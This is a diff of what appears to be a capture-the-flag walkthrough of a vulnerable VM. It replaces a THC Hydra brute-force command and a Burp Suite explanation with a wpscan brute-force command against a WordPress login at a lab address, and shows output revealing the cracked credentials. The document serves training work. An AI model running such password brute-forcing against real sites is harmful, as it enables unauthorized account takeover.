@@ -130,21 +130,27 @@ for i in dic: fsocity.write("%s" % i)
 ```
 
 Now, using the sorted wordlist and the username 'Elliot' (the most commonly occurring
-username in the .dic file) we can attempt to crack the WordPress login. I'll be
-using THC Hydra to do my web cracking, which means to properly format our Hydra
-commands we'll need to get the login request parameters. I'll use Burp Suite for
-this task. If you're not familiar with Burp, read up on its basic usage [here](https://portswigger.net/burp/help/)
-before trying this. In essence, we proxy our web browser through the localhost on
-port 8080 (the default for Burp), then attempt a login. Burp will intercept the
-request/response traffic, and allow us to see the login form's internals. What we're
-really looking for is the method (usually POST), the form parameters, and the failure
-response. With all of this information assembled, we can construct our hydra command:
+username in the .dic file) we can attempt to bruteforce the WordPress login. I'll be
+using the wpscan tool for my web cracking.
 
 ```shell
-root@bento~# hydra 10.0.2.10 http-form-post "/wp-login.php:user_login=^USER^&user_pass=^PASS^:lostpassword" -l Elliot -P fsocity_sorted.dic -t 10
+root@bento:~# wpscan -u http://10.0.2.10/ --wordlist fsocity_sorted.dic --username Elliot
+  Brute Forcing 'Elliot': |===================================
+  [+] [SUCCESS] Login : Elliot Password : ER28-0652
+
+  Brute Forcing 'Elliot': |===================================
+  +----+--------+------+-----------+
+  | Id | Login  | Name | Password  |
+  +----+--------+------+-----------+
+  |    | Elliot |      | ER28-0652 |
+  +----+--------+------+-----------+
+
+[+] Finished: Mon Aug  8 12:57:26 2016
+[+] Requests Done: 7853
+[+] Memory used: 11.816 MB
+[+] Elapsed time: 00:02:09
 ```
 
-From Burp, we have 'user_login' and 'user_pass' as the form params, and 'lostpassword'
-as the failure message.
+Input the credentials into the login form... and we're in.
 
 -TC
